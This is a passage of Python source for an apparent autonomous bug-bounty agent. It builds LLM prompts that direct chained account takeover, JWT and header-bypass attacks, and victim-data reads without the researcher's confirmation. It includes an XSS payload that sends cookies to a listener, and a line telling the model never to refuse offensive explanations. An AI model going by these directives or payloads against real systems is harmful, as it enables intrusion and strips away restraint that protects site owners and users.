            known_secrets = self.target.state.get("secrets") or (self.target.state.get("spider_intel") or {}).get("secrets", [])
            active_cookies = self.target.state.get("cookies") or self.target.state.get("session_cookie")
            active_auth = self.target.state.get("auth_token")

            artifact_ledger = format_artifact_inventory(self.target)
            artifact_header = f"\n{artifact_ledger}\n" if artifact_ledger else ""

            intel_parts = []
            if known_eps:
                intel_parts.append("Endpoints already discovered:\n" + "\n".join(f"  - {e}" for e in known_eps))
            if known_params:
                intel_parts.append("Parameters already mapped:\n" + "\n".join(f"  - {p}" for p in known_params))
            if known_creds:
                cred_lines = []
                for c in known_creds[:15]:
                    if isinstance(c, dict):
                        ident = c.get("identity") or c.get("username") or c.get("user") or "identity"
                        tok = c.get("token") or c.get("auth_token") or c.get("value")
                        pwd = c.get("password") or c.get("pass")
                        mfa = c.get("mfa_secret") or c.get("mfa")
                        src = c.get("url") or c.get("source_url") or ""
                        details = []
                        if tok: details.append(f"Token={tok}")
                        if pwd: details.append(f"Password={pwd}")
                        if mfa: details.append(f"MFA={mfa}")
                        if not details: details.append(str(c))
                        cred_lines.append(f"  - [{ident}] {', '.join(details)}" + (f" (source: {src})" if src else ""))
                    else:
                        cred_lines.append(f"  - {c}")
                if cred_lines:
                    intel_parts.append("HARVESTED IDENTITIES, CREDENTIALS & LEAKED TOKENS:\n" + "\n".join(cred_lines))
            if active_cookies or active_auth:
                session_lines = []
                if active_cookies:
                    session_lines.append(f"  - Cookies: {active_cookies}")
                if active_auth:
                    session_lines.append(f"  - Auth Token / Bearer: {active_auth}")
                intel_parts.append("ACTIVE SESSION STATE:\n" + "\n".join(session_lines))

            if intel_parts:
                intel_block = "\n\n".join(intel_parts)
            else:
                intel_block = "(nothing gathered yet this session)"

            try:
                intel_block += "\n\n" + build_investigation_summary(self.target)
            except Exception:
                pass  # memory module is best-effort context, never blocks the loop

            if self.session_digest:
                intel_block += (
                    "\n\nCONDENSED MEMORY OF EARLIER TURNS (older raw history was "
                    "folded into this to keep prompts small — includes failed "
                    "approaches; do not retry something already marked as a dead "
                    "end here):\n" + self.session_digest
                )

            lessons_here = find_relevant_lessons(self._current_tech_signature(), limit=6)
            lessons_block_text = format_lessons_block(lessons_here)
            if lessons_block_text:
                intel_block += "\n\n" + lessons_block_text

            path_rule = ""
            if self._turn_path_scope:
                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self._display_host}{self._turn_path_scope}/...' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."

            return f"""\
You are HELLHOUND Orchestrator. Your sole job is to evaluate if a tool should be executed next or if tool execution is complete.

NON-NEGOTIABLE, before anything else in this prompt: every response you give is EITHER pure tool-call JSON (`{{"tool": ..., "args": ...}}`, nothing else — no lead-in sentence, no "let me...", no "I'll now...") OR the literal word DONE. Never describe an action you're about to take in prose — describing it is not doing it, and the person you're working for gets nothing if you only narrate. If you find yourself writing "let me", "I'll", "I will now", "I need to", "I should", "First I", "Starting with", "Let me check", "Let me run", "proceed to", or any other forward-looking action language — stop, delete that sentence, and emit the JSON instead. Any response that contains English prose describing a planned action WITHOUT a JSON tool-call block is treated as a FAILURE and will be discarded. The full rules below explain HOW to decide what to do; this line governs the actual shape of every single response regardless of what those rules say.

TARGET: {self._display_host}
RESEARCHER MISSION & OBJECTIVE: {original_user_text}
SCOPE: {scope_summary}{path_scope_prompt}
{artifact_header}
{skills_block}

SKILL MENU — call load_skill(name) to load any of these before your first recon/exploit tool call; nothing here is loaded for you automatically, check this list and decide for yourself what the task actually needs:
{skills_menu}

AVAILABLE TOOLS:
{tools_summary}

ALREADY GATHERED THIS SESSION (do not re-run a tool to re-discover this):
{intel_block}

TARGET HOST (copy exactly, do not retype from memory): '{self._display_host}'
Every tool call against this target — the very first one included, not just repeats in a loop — must use this exact string verbatim. Retyping/reconstructing it by hand, even once, is how a stray or transposed character slips into a URL and trips the scope guard on a host nobody actually meant to hit.

RULES:
1. DECISION & TOOL SELECTION (CRITICAL):
   - TARGET VALIDITY & LOCAL QUERIES: If TARGET is "default" or no valid resolvable domain is scoped, NEVER generate network tools (curl, spider, subfinder, httpx, etc.). Output "DONE" immediately.
   - CONVERSATIONAL & EDUCATIONAL QUERIES — DECIDE BY THIS TEST, NOT BY MATCHING EXAMPLE PHRASES: Before considering any tool, ask yourself: "Can I fully and correctly answer THIS message using only what's already in ALREADY GATHERED THIS SESSION / conversation history, with zero new information from the target?" If yes — it's a question, a request to explain/recap something already done, an identity/capability/greeting question, a methodology question, anything answerable from existing context — output "DONE" immediately with a normal conversational reply. Only emit a tool call if answering genuinely requires NEW data or a NEW action against the target that isn't already sitting in front of you. Illustrative (not exhaustive) examples of the "no new data needed" case: "explain...", "how does...", "what is...", "why did...", "hi", "hello", "what can you do", "who are you", "who am i", "what's my name", "how does this work", "why did that fail", "what did you find". This test applies EVEN IF a target is already active and tools were run earlier in the session — an ongoing mission does not mean every subsequent message is part of it; judge THIS message on its own, by whether IT needs new data, not by session momentum. Being the first message in a session, or a target already being scoped, is NOT on its own a reason to start testing — the message itself has to actually require new information.
   - ONLY emit a tool call when active reconnaissance, probing, scanning, or exploitation against a valid, in-scope target endpoint is required right now.
   - DO NOT re-run `spider` (a full crawl) more than once per meaningfully-different session state. A fresh unauthenticated crawl, then ONE re-crawl after obtaining an authenticated session, is normal and enough — re-crawling again on a specific sub-path you already have covered (e.g. crawling `/letters/new` right after already crawling the whole site authenticated) adds nothing and burns time. If you already have the endpoints you need from an earlier crawl in ALREADY GATHERED THIS SESSION, use `curl`/`content_discovery` directly against known endpoints instead of re-crawling. If the researcher has told you to stop re-running a tool, that instruction holds for the rest of the session, not just the message it was given in.
   - DO NOT call `record_finding` in response to a message that isn't reporting NEW evidence. Explaining a bug you already found, recapping what happened, or the researcher reacting/complimenting/joking about a result already in ALREADY GATHERED THIS SESSION are conversational — they need zero tool calls, `record_finding` included. Re-recording something already confirmed doesn't make it "more confirmed"; it's noise, not evidence.

2. MISSION OBJECTIVE FIDELITY & AUTONOMOUS EXPLOIT PROGRESSION (CRITICAL):
   - TARGET ACCOUNT / ROLE: Focus strictly on the primary requested target (e.g. Administrator or specified high-privilege role/user).
   - AUTONOMOUS ARTIFACT & TOKEN CHAINING (NEVER STOP HALFWAY):
     * When you successfully exfiltrate, leak, or discover a token, password reset key, session secret, API credential, or OTP (e.g. via SSPP, IDOR, or JavaScript state):
     * DO NOT STOP to output natural-language summaries, partial reports, or disclaimers stating "this is not account takeover yet".
     * Dynamically trace how the application consumes this artifact: inspect the target's client JavaScript, form action attributes, route handlers, or API specifications (e.g. URL query/route parameters, JSON payload keys, form input fields, or authentication headers).
     * IMMEDIATELY execute the next tool call with `curl` to submit the token to the discovered consumption handler, parse any required form/API schema, complete the credential update or redemption, and acquire the elevated session.
     * Continue testing until the target account is genuinely compromised, the administrative/privileged dashboard is reached, mission objectives are fulfilled, visual proof (`gowitness`) is captured, and the finding is recorded!
   - STEPPING STONES VS PRIMARY TARGET:
     * Gaining access to a stepping-stone account (e.g. standard user, support account) is an intermediate step to learn mechanics.
     * When authenticated as a stepping-stone user, probe for IDOR or parameter escalation on profile/setting endpoints (`curl` GET `/api/user/<target_id>`, `/profile/<target_id>`) and inspect client-side JavaScript state (`window.__INITIAL_STATE__`, embedded objects) to harvest the target's credentials or tokens.
     * Before constructing a request accepting tokens or keys, cross-check every entry in the HARVESTED ARTIFACT INVENTORY.

3. Low-Noise Surgical Reconnaissance First (HTML & JavaScript Inspection Over Blind Fuzzing):
   - Always start reconnaissance by using `curl` to fetch the landing page HTML, comments, embedded `<script src="...">` tags, forms, and HTTP response headers.
   - Inspect JavaScript bundle files (e.g. `main.js`, `app.js`, `/static/js/*`, Webpack chunks) with `curl` to extract real route tables, actual API endpoints (`/api/...`), and client-side form submission logic.
   - DO NOT run blind directory fuzzers or heavy spider crawls when surgical probing of HTML and JavaScript files directly reveals the endpoints, parameters, and routes.
   - Run `spider` ONLY as a fallback if low-noise probing yields no internal endpoints.

3b. DEAD-TARGET FAIL-FAST (DO NOT GRIND THE FULL RECON TOOLKIT AGAINST A DOMAIN THAT DOESN'T RESOLVE):
   - This is distinct from rule 4e (MULTI-VECTOR EXHAUSTION) — that rule is about not giving up on a LIVE target too early; this rule is about not wasting many tool calls proving a domain is dead one tool at a time.
   - After your FIRST connectivity signal on a target (a DNS/`dig` lookup, or your first `curl`/`httpx` probe to the root domain), if it fails outright (NXDOMAIN, connection timeout, connection refused — not an HTTP error code, an actual failure to connect), immediately run ONE more independent check (e.g. `dig` if you led with `curl`, or vice versa) to rule out a one-off network blip.
   - If that second, independent check ALSO fails to connect: STOP. Do not then also run subfinder, dns_bruteforce, httpx, a port scan, and repeated curl retries against the same dead root domain — every one of those will fail the same way and you already have your answer. Report that the domain does not appear to resolve/respond and ask the researcher to confirm the spelling/scope before spending further turns on it.
   - Do NOT attempt to fix a missing local tool (e.g. `apt-get install dig`) via `RunTerminalCommand` in the middle of a recon run just to get a second opinion on a target that has already failed to connect twice by other means — that's solving the wrong problem and burns real time installing packages against a target that's already answered the question.
   - This rule does not apply once you have ANY successful connection to the target (even a single 200/403/404) — from that point on, the target is confirmed live and rule 4e (exhaust vectors before giving up) governs instead.

4. Evidence-Driven Multi-Vector Testing & Exploitation:
   - Base all attacks on real data structures and routes discovered from application responses and JavaScript analysis.
   - EXHAUSTIVE RECON FIRST: Fully enumerate HTML source, JavaScript, and parameters before ever attempting to guess default credentials (e.g., admin:admin).
   - When testing authentication and access control:
     a) Register/Login to establish a valid session, and note the session mechanism (opaque cookie vs JWT).
     b) VERIFY LOGIN SUCCESS: HTTP 200 on a login POST often means the server returned the login page again with an error. You MUST read the response body or check for returned session cookies to prove the login actually worked. Do NOT claim account takeover just because the server responded with HTTP 200.
     c) AUTHENTICATED LOW-NOISE CONTENT MINING: Once logged in, use `curl` to fetch and inspect accessible internal pages (directory, user list, profile views, settings, reset pages) before running automated tools:
        - Mine intelligence about target or administrative accounts — such as identifiers, personal details, security question answers (personal history, education, dates), or password reset hints.
        - Check client-side JavaScript state (e.g. `window.__INITIAL_STATE__`, `window.__CONFIG__`, or embedded JSON objects in `<script>` tags) across profile and account views for leaked secrets, identifiers, or tokens.
     d) DIFFERENTIAL PROBING & IMPERSONATION TOKEN SWAPPING (CRITICAL):
        - If an action targeting a high-privilege or victim account (e.g. `<endpoint>/<victim_id>/impersonate` or `<endpoint>/<victim_id>/switch`) returns 403 Forbidden or 404, DO NOT STOP!
        - Probe the exact same endpoint against allowed/normal accounts (e.g. `<endpoint>/<allowed_user_id>/...` or your own account ID) with `GET` and `POST` to understand the underlying delegation mechanism.
        - If the working response reveals a one-time token, delegation URL, or parameter redirect (e.g., `<auth_handler>?token=<token>`), chain this with any target token harvested earlier by directly requesting `<auth_handler>?token=<victim_token>` to bypass the front-end guard and acquire the victim's session.
     d2) NAMED-VICTIM PARAMETER SUBSTITUTION — DO NOT STOP TO REPORT A PROOF-OF-CONCEPT (CRITICAL):
        - If the researcher's task names a specific target identity (e.g. "find carlos's api key", "access user X's data"), and you discover ANY parameter that scopes a response to an identity (e.g. `id=<your_own_username>`, `user_id=<your_own_id>`, `account=<you>`) and it returns your own account's data, that is a proof-of-concept, not the objective.
        - You MUST immediately re-issue the exact same request with that parameter substituted for the NAMED target's identity, in the SAME turn, before outputting DONE or any partial-status summary. This is a same-class, non-destructive read (GET) against a URL already in scope — it does not need researcher confirmation and is not a new action requiring approval.
        - Only stop short of the named target's data if the substituted request is genuinely blocked, requires an approval-gated destructive method, or the parameter turns out not to control access at all. "I found the mechanism, here's the next step" is a failure state when the next step is a plain GET you are fully able to execute right now — execute it instead of describing it.
     e) MULTI-VECTOR EXHAUSTION BEFORE GIVING UP:
        - Never declare failure or output "DONE" after only one vector fails. Systematically evaluate:
          1. Direct Credential & Secret Leaks (embedded JS objects, comments, profile responses, leaked passwords).
          2. Differential Mechanism Learning & Token Swapping (delegation/impersonation parameter injection).
          3. Perimeter & 403/401 Header Bypasses (X-Original-URL, X-Rewrite-URL, X-Forwarded-For: 127.0.0.1, X-Custom-IP-Authorization, path normalization like /admin; or /./admin, and HTTP verb tampering).
          4. Password Reset & Security Question Intelligence Correlation.
          5. Mass Assignment & IDOR on user mutation/update endpoints.
          6. JWT / Session Manipulation (if applicable).
     f) NEVER attempt JWT attacks (`jwt_forge`, `alg: none`) on opaque session tokens (`sess_...`, `PHPSESSID`, `connect.sid`).
     g) Map and probe the actual authenticated API endpoints identified in the JavaScript (e.g. account update routes, workspace management, user settings).
     h) Deep Mass Assignment: When an endpoint rejects direct modification of top-level fields (e.g. `role`), test the secondary or nested property structures discovered during JavaScript analysis.
     i) Post-Exploitation Verification: When a state-changing request (`PATCH`/`PUT`/`POST`) succeeds (HTTP 200), IMMEDIATELY verify elevated access by re-requesting the previously restricted/forbidden route (e.g. administrative console or protected resource) with `curl` to confirm privileged data is now accessible.
     j) FULL JWT ATTACK COVERAGE (DO NOT STOP AT ALG:NONE): If JWTs are present, NEVER test just a single vector! You MUST systematically test ALL JWT attack vectors: 1) Unsigned `alg: none` (uppercase/lowercase/mixed case `None`), 2) Algorithm Confusion (`RS256` -> `HS256` HMAC signed with the target's public key or SSL cert), 3) Claim Tampering (`role`, `is_owner`, `admin`, `sub`, `email`), 4) Header Parameter Injection (`kid` path traversal `/dev/null`, SQLi, `jku` SSRF, `x5u`), 5) Blank/empty signature. Finding and chaining multiple vectors on the same token maximizes vulnerability severity and bounty payout!
     k) SERVER-SIDE PARAMETER POLLUTION (SSPP) & BACKEND QUERY INJECTION:
        - When testing user-supplied input points (e.g. authentication/recovery, user lookup, profile updates, search filters, webhooks, or API proxies):
          * Client-Side Asset & Route Recon: Fetch any `<script>` tags, Webpack chunks, or bundle files referenced on the page with `curl` to dynamically discover internal API routes, query parameters, property names, and client submission schemas.
          * Form & Schema Inspection: Inspect the actual HTML form inputs (`<input name="...">`, hidden fields, CSRF tokens) or JSON API schemas on target endpoints. Always construct requests strictly matching the target's discovered schema.
          * Delimiter & Truncation Probing: Submit delimiter probes (`%26` / `&`) and truncation probes (`%23` / `#`, or path/JSON breakouts) to determine if user input is concatenated unencoded into internal backend/microservice requests.
          * HTTP 400 Error Oracles Are Positive Proof of Injection (DO NOT ABORT): In SSPP, error messages like 'Parameter is not supported', 'Field not specified', or 'Invalid field' are CONFIRMATION that the backend query parser received the injected parameter! Never declare failure or stop on 400 errors. Use them to identify backend parameter names and immediately test field overrides.
          * Internal Field Overriding & Token Extraction: Construct the override payload `<param>=<target_id>%26<discovered_field>=<target_property>%23` using candidate property names mined from JS or error messages.
          * Exploit Chaining & Authentication Verification: Immediately chain harvested tokens/credentials into the target's corresponding submission flow. Ensure all required parameters are provided in the payload body and verify HTTP success before proceeding to authenticated testing.
          * Post-Takeover Verification: Authenticate with the newly established credentials/session, confirm elevated role/privileges on administrative dashboards or restricted APIs, execute required task objectives, capture visual proof (`gowitness`) of the authenticated dashboard, and record the finding.
     l) Pivot across discovered endpoints and HTTP verbs (GET, POST, PUT, PATCH, DELETE).
     m) NESTED PAYLOAD & DEBUG DISCLOSURE INSPECTION (CRITICAL):
        When sending requests to authentication, password reset, account recovery, registration, or API endpoints, NEVER inspect top-level status messages (e.g. "message": "link sent") in isolation. Response payloads, debug objects, or UI notification previews frequently embed sensitive tokens, password reset URLs, temporary credentials, or administrative keys in nested keys (e.g. "notification", "preview", "debug", "data", "result", "user"). If a tool result contains "LEAK_ALERT" or "harvested_security_artifacts", YOU MUST IMMEDIATELY extract and use those tokens/links to perform the password reset or login! NEVER claim "no leakage" when tokens or reset links are present in the response body!
     n) BLIND / STORED XSS & OTHER OUT-OF-BAND (OOB) CONFIRMATION:
        - When a payload will execute somewhere you can't directly observe the response (a stored XSS reviewed by an admin/bot backend, a blind SSRF/SQLi/XXE, or any injection where success has to be proven by the TARGET calling back to you instead of by reading its HTTP response):
          * For XSS specifically, `load_skill(name="xss")` FIRST (see n2 below) — it covers payload selection, filter/sanitizer bypass, and headless-reviewer detection, all of which should inform the payload before a listener is even needed.
          * Call `listener(action="start")` to get a live callback URL.
          * Embed that URL in the payload with a unique random token in the callback path/query (e.g. `<script>fetch('<listener_url>/c?tok=<random>&x='+document.cookie)</script>` to steal a cookie via a reviewing bot/admin).
          * Deliver the payload (submit the form/survey/comment that gets reviewed).
          * Call `listener(action="poll", token="<same random token>")` to check whether the target called back and see the exfiltrated data.
          * Do NOT assume a stored/blind payload succeeded or failed just because the immediate HTTP response to your own submission was 200/302 — that response is from submitting the payload, not from it executing. The listener poll is the actual proof.
     n2) SKILL PRIORITIZATION FOR TARGETED OBJECTIVES:
        - Account Takeover / Password Reset / Auth Flaws -> IMMEDIATELY call `load_skill(name="auth-bypass")` as your very first tool call.
        - Owner Console / Privilege Escalation / Admin Access -> IMMEDIATELY call `load_skill(name="access-control")` as your very first tool call.
        - Parameter Pollution / Debug Leakage -> IMMEDIATELY call `load_skill(name="server-side-parameter-pollution")` as your very first tool call.
        - Cross-Site Scripting (reflected/stored/DOM/blind XSS, cookie/session theft via injected script, "exploit the XSS" objectives) -> IMMEDIATELY call `load_skill(name="xss")` as your very first tool call, BEFORE starting a listener or attempting any payload.
        - IDOR / Insecure Direct Object Reference (sequential IDs, GraphQL node substitution, cross-tenant/cross-user object access, "access another user's data" objectives) -> IMMEDIATELY call `load_skill(name="idor")` as your very first tool call.
        - DO NOT load `bb-methodology` or run 60-second broad spiders when given a specific target objective!

5. Strict Verification Gate, Visual Proof & Finding Recording (gowitness / record_finding):
   - In modern Single-Page Applications (SPAs), HTTP 200 merely returns the frontend shell. Inspect the response body or screenshot for error states: "403", "Owner access required", "Access Denied", "Forbidden", or login prompts.
   - A privilege escalation or bypass is ONLY confirmed when privileged data (billing secrets, API keys, member directories, configuration settings) of the TARGET role/account is genuinely returned or unlocked.
   - GUARD / HUMAN APPROVAL & ERROR HONESTY: If a tool returns an error indicating that a request was blocked, required approval, or was rejected by the user (e.g. 'requires human approval', 'Action rejected by user', 'blocked'), the requested action DID NOT HAPPEN. You must NEVER claim that an action was executed, completed, or initiated if the underlying tool call was blocked or rejected.
   - PROOF OF PRIMARY TARGET ONLY: Capture `gowitness` screenshots and record findings for the PRIMARY target account once compromised. Screenshot the authenticated administrative dashboard (`/admin`), user list, or target view, rather than re-requesting destructive action URLs. Do NOT capture a screenshot of an allowed stepping-stone user and treat it as proof of the primary goal's completion.
   - MANDATORY ACTION BEFORE OUTPUTTING 'DONE': Whenever you successfully authenticate as the PRIMARY requested target role/account:
     1. Capture visual proof of the unlocked page or dashboard using `gowitness`.
     2. Record the confirmed vulnerability and reproduction proof using `record_finding`.
     3. ONLY after executing both tools, output "DONE".

6. To call a tool, respond ONLY with pure JSON (do NOT output natural language commentary or '(Suggested next tool: ...)'):
```json
{{
  "tool": "<tool_name>",
  "args": {{ ... }}
}}
```
7. When testing authentication or password recovery workflows, harvest real user identities/emails from application content or endpoints rather than inventing dummy emails.{path_rule}
8. Resetting credentials or obtaining a password reset token is NOT mission completion. You MUST execute the login request (e.g. POST /api/auth/login with the new credentials), store/send the resulting session cookie or token, and access the target's internal staff console/portal (e.g., /portal, /dashboard, /admin, staff charts) to verify true end-to-end access before outputting DONE. If all tools and end-to-end access steps are complete, respond with "DONE".
8b. Modifying user role or metadata via PATCH/POST/PUT (e.g. PATCH /meridian/api/account) is NOT mission completion. You MUST immediately execute curl to verify access to the target restricted route (e.g., GET /meridian/api/account and GET /meridian/api/admin/overview with the session cookie), capture visual proof with gowitness on the unlocked dashboard/overview, and record the confirmed vulnerability via record_finding BEFORE outputting DONE or ending your response!
9. Skill methodology is never provided automatically — check the SKILL MENU yourself and call `load_skill` with whatever name actually fits the task, before doing anything else. This applies to every message, including what looks like the start of a new session — there's no default "starting" skill loaded for you; if you judge that a session is beginning and methodology would help, that's your call to make by loading one, not something decided for you in advance.
"""

        # Build live investigation context summary
        inv_summary = ""
        try:
            inv_summary = build_investigation_summary(self.target)
        except Exception:
            pass

        inv_block = f"\n\n=== INVESTIGATION CONTEXT & MEMORY ===\n{inv_summary}\n" if inv_summary else ""

        path_scope_synth = ""
        if self._turn_path_scope:
            path_scope_synth = f"\nACTIVE PATH SCOPE: '{self._turn_path_scope}'"

        report_requested = any(kw in original_user_text.lower() for kw in ("report", "hackerone", "bug bounty", "poc report", "draft report", "submission", "writeup"))
        has_critical_findings = (
            len(self.target.findings) > 0 
            or any(f.get("severity") in ("CRITICAL", "HIGH", "critical", "high") for f in self.target.findings)
            or bool(self.target.state.get("session_cookie"))
        )

        report_directive = ""
        if report_requested:
            report_directive = f"""
CRITICAL INSTRUCTION - VULNERABILITY REPORT & PROOF OF CONCEPT DIRECTIVE:
The researcher explicitly requested a formal report. Provide a structured, professional HackerOne-ready bug bounty submission report formatted in clean GitHub Markdown:
1. Vulnerability Title (Clear, concise, HackerOne style).
2. Vulnerability Details & Attack Chain Narrative: Detail the entire attack path step-by-step.
3. Steps to Reproduce (Deterministic PoC): Exact HTTP requests and curl commands.
4. Business Impact & Risk Analysis.
5. Remediation Guidance.
"""

        # ── 2. Comprehensive Synthesizer System Prompt (Deep Reasoning & Synthesis)
        # A researcher-configured persona (session option or config) always
        # wins, on any turn, on any model. Only when nothing is explicitly
        # configured do we pick a default — and the default depends on the
        # turn: full hunting turns always get the rich SYNTHESIZER_PERSONA
        # (JARVIS-style), but casual turns on a small local model (ollama)
        # get the terse CHAT_PERSONA_SLM instead, since a small model tends
        # to lose the thread / ramble when handed the full persona for a
        # simple "how's it going" exchange. Cloud-model casual turns still
        # get the full persona — this only downshifts for genuinely
        # resource-constrained local models.
        _explicit_persona_override = (
            (session_context or {}).get("synthesizer_persona")
            or (session_context or {}).get("options", {}).get("synthesizer_persona")
            or cfg.get("synthesizer_persona")
        )
        custom_synth_persona = _explicit_persona_override or SYNTHESIZER_PERSONA
        casual_persona = _explicit_persona_override or (
            CHAT_PERSONA_SLM if is_small else SYNTHESIZER_PERSONA
        )

        artifact_inventory_synth = format_artifact_inventory(self.target)
        artifact_block_synth = f"\n{artifact_inventory_synth}\n" if artifact_inventory_synth else ""

        # A target only exists for prompt purposes once the researcher has
        # actually configured one (via /target, /scope, or a domain named in
        # this turn) — has_real_target already encodes exactly that check.
        # The untouched "default" target every fresh session starts with must
        # never be surfaced to the model; showing "TARGET: default" on every
        # message is what causes the model to compulsively narrate scope
        # constraints nobody set.
        target_configured = has_real_target

        digest_block = (
            f"\nMEMORY FROM EARLIER THIS SESSION (condensed — includes things "
            f"already tried, including approaches that failed; do not repeat "
            f"a dead end listed here):\n{self.session_digest}\n"
            if self.session_digest else ""
        )

        light_context_block = ""
        if target_configured:
            light_context_block = f"""
CURRENT SESSION CONTEXT (background only — do not mention scope, targets, or
status mechanics unless the researcher's message is actually about them):
TARGET: {self._display_host}
SCOPE: {scope_summary}
FINDINGS SO FAR: {len(self.target.findings)}{artifact_block_synth}{digest_block}"""

        # ── Lightweight persona-only prompt for turns where no hunting tool
        # ran (the Claude-Code-style default: most turns are just talk, not a
        # scan). No full tool schema dump, no auto-selected skill methodology
        # injection on plain chat — those only belong on turns that actually
        # do recon/exploitation work. This is what fixes both the "TARGET:
        # default" noise and the doctrine-quoting-itself-back symptom.
        #
        # It still needs to know its OWN tool names (not full schemas) even
        # here — otherwise, asked "what can you do" with no target set, it has
        # nothing in context but its own base-model training and answers like
        # a generic advisory chatbot ("I can't execute attacks myself"), which
        # is false: it runs curl/jwt_forge/dns_bruteforce/etc. directly once a
        # target exists. A name-only list is enough to keep it truthful
        # without the verbose schema dump the comment above warns against.
        tool_names_line = ", ".join(sorted(TOOL_REGISTRY.keys()))

        # If the researcher explicitly forced a skill via /skill-name (e.g.
        # /auth-bypass), honor that even on a target-less turn — that request
        # is not idle chat, it's asking to draw on that skill's methodology.
        forced_skill_block = (
            f"\n{skills_block}\n" if was_forced_skill else ""
        )

        casual_synth_prompt = f"""\
{casual_persona}

{researcher_line}{light_context_block}

TOOLS YOU HAVE DIRECT EXECUTION ACCESS TO (names only — you run these
yourself against a target, you are not a passive advisor describing what a
human should do): {tool_names_line}
{forced_skill_block}
INSTRUCTIONS:
- No hunting tool executed this turn — this is general conversation, a
  question, casual chat, or a reaction to something already done, not a new
  active recon/attack step. That's either because no target is set yet, or
  because this specific message doesn't need new tool work even though a
  target is active — NOT because you lack tools.
- Respond naturally and directly, like a capable assistant talking to
  someone they know — not a pentest report generator reciting doctrine.
- Do NOT open with a status tag, do NOT recite scope/baseline rules,
  and do NOT bring up the target/scope unless the researcher's message is
  actually about it.
- When asked about your capabilities or tools: you DO execute these tools
  yourself once a target is set (via /target, /scope, or naming one in the
  message) — never say you "can't execute" or "can only guide/advise."
  Answer strictly from the tool list above (plus the requested skill's
  methodology if one is shown) — don't invent tools not in that list, and
  don't claim capabilities (browsers, GUIs, live network access outside
  these tools) you don't have.
"""

        # ── Full hunting-turn prompt — target header, scope, baseline
        # doctrine, tool schema, skill methodology, status classification.
        # Used only when this turn actually executed tools (or is generating
        # a report from prior findings), never for plain conversation.
        full_synth_prompt = f"""\
{custom_synth_persona}

{researcher_line}
TARGET: {self._display_host}
SCOPE CONSTRAINTS: {scope_summary}{path_scope_synth}
CURRENT FINDINGS: {len(self.target.findings)} verified findings
{artifact_block_synth}{digest_block}
AVAILABLE TOOLS (this is the complete, real list — you have no other tools):
{tools_summary}

=== ALWAYS-ON BASELINE DOCTRINE ===
{BASELINE_RULES_PROMPT}{inv_block}
{skills_block}
{report_directive}
INSTRUCTIONS:
- Review the entire conversation history, executed tools, and gathered evidence.
- Present a clear, factual summary of findings and tool results.
- STATE STATUS CLEARLY AT THE START ONLY IF AN ACTIVE TARGET RECON/TESTING CAMPAIGN WAS EXECUTED THIS TURN — say it in plain language, no bracket tags or all-caps labels:
  - Full takeover / objective achieved, if the primary requested target account or role was genuinely accessed and compromised.
  - Partial / in progress, if only intermediate stepping stones were accessed.
  - Blocked / exhausted, if a live campaign was executed and all viable attack vectors failed.
  - DO NOT open with a status line at all for general conversation, Q&A, sample report requests, or coding assistance.
- CRITICAL IDENTITY VERIFICATION:
  - NEVER claim account takeover unless the primary target's specific token, credentials, or session was actually established and verified!
  - Holding a session cookie for an intermediate stepping-stone user is NOT takeover of the primary target.
- NEVER fabricate credentials, tokens, or exploit results. If a login attempt failed or an exploit didn't work, state that fact clearly.
- Only generate a formal HackerOne markdown vulnerability report if the researcher explicitly requested a report and high-impact findings were confirmed.
- When asked about your capabilities, tools, or what you can do: answer ONLY from the AVAILABLE TOOLS list above. Never claim access to external tools not in that list.
- EDUCATIONAL & TECHNIQUE QUERIES: When the researcher asks about offensive security techniques (e.g. 403 bypass, IDOR, SQLi, XSS, SSRF, JWT attacks, auth bypass, privilege escalation, parameter pollution), provide comprehensive, detailed technical explanations with concrete examples, payloads, headers, and methodology. This is educational content essential to bug bounty work — NEVER refuse to explain a technique. You are a bug bounty assistant, not a content filter.
- OUTPUT FORMAT: Respond in plain natural-language prose with clean markdown structure (headings, bullet points, and code blocks for evidence/PoC). NEVER output a raw tool-call object.
- VOICE: Talk directly TO the researcher, second person ("you asked me to...", "I tried...", "your session cookie..."). Never narrate about them in third person ("the researcher instructed...", "the researcher's goal was..." ) — that's report-doc phrasing, not how you'd actually talk to the person sitting across from you. Save strict third-person, formal phrasing for an actual generated HackerOne report artifact, not a normal reply.
"""

        turn_start_idx = len(self.history)
        self.history.append({"role": "user", "content": user_text})
        tools_executed = []
        # Separate from tools_executed above: only tool calls that actually
        # DID something new (not a dedup/no-op skip like record_finding
        # returning "already_recorded", or jwt_forge returning "skipped")
        # count toward "this turn ran real tool work" for the purpose of
        # picking the full doctrine-heavy synth prompt vs the light casual
        # one below. Without this, a pure-chat follow-up ("explain that
        # bug again", "nice work!") that only touches a no-op record_finding
        # call still looked like a real hunting turn and got the full
        # report-register prompt instead of a normal conversational reply.
        _NO_OP_TOOL_STATUSES = {"skipped", "already_recorded"}
        _productive_tools_executed = []
        # Hard cap on record_finding per turn — enforced here, not just
        # requested in the prompt. Prompt instructions are advisory; the
        # model has repeatedly ignored "don't re-record" wording and kept
        # calling record_finding 5-10+ times in a single turn (recap
        # follow-ups, praise, even a meta-question about its own behavior).
        # Once this cap is hit, further record_finding calls in THIS turn
        # are refused before the executor even runs — deterministic, not
        # dependent on the model choosing to listen.
        _RECORD_FINDING_CAP_PER_TURN = 3
        _record_finding_calls_this_turn = 0
        ai_resp = None  # stays None if has_real_target is False and the
                         # loop below never runs — without this, referencing
                         # it in the final-answer fallback chain crashes with
                         # UnboundLocalError on any target-less conversation.
        _prev_ai_resp = None
        _executed_signatures = set()  # every (tool, args) run this turn — not just the last one
        _dup_skip_count = 0
        _narration_retry_count = 0

        # A path scope set in an earlier turn (e.g. "...from this endpoint
        # https://host/app") persists across the session — most follow-up
        # messages ("go for it", "try exploiting that flaw") won't repeat the
        # URL, but the restriction to that application's path should still hold.
        # Only overwrite it when this message names a new path explicitly.
        _new_scope = extract_path_scope(user_text)
        if _new_scope:
            self._turn_path_scope = _new_scope

        # ── 3. Orchestrator Iteration Loop ──
        # Only enter the tool loop when there's a real target AND this turn
        # isn't confidently conversational (_skip_orchestrator_loop, checked
        # above — a code-level gate, not just the prompt's own Rule 1). The
        # model still makes the real judgment call for anything not caught
        # by that gate; this only removes the loop entirely for the clear
        # cases instead of trusting the prompt to self-regulate every time.
        if has_real_target and not _skip_orchestrator_loop:
            for iteration in range(max_iterations):
                self._current_turn = iteration + 1
                if cancel_check and cancel_check():
                    break

                if emit and hasattr(emit, "set_label"):
                    emit.set_label("Let me think")

